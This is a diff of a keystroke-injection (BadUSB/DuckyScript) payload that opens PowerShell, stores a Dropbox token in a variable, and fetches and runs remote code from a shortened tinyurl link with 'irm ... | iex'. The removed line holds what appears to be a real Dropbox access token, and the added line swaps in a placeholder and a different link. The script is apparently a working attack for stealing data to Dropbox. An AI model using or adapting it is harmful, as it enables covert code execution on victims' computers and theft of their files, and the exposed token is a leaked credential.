@@ -3,8 +3,7 @@ SLEEP 1
 STRING powershell
 ENTER
 SLEEP 1
-STRING $db = 'sl.BuUyCWRSmcECTwsFQvh_u7Bgw3t32HWXkiY-S3tOh-5G9vrFCZ7uoQk4HmTFgvu4NeLi-YHgmimAen5pIV6dB7PE9VuE-oT7eshbYwurf9nHq6lYfw9TOXgu6kTXxPZ1anjkOMpMyp4ux2k
-'; irm tinyurl.com/488cxscc | iex
+STRING $db = 'INSERT YOUR DROPBOX TOKEN HERE'; irm tinyurl.com/3tm7msr7 | iex
 ENTER
 STRING exit
 ENTER
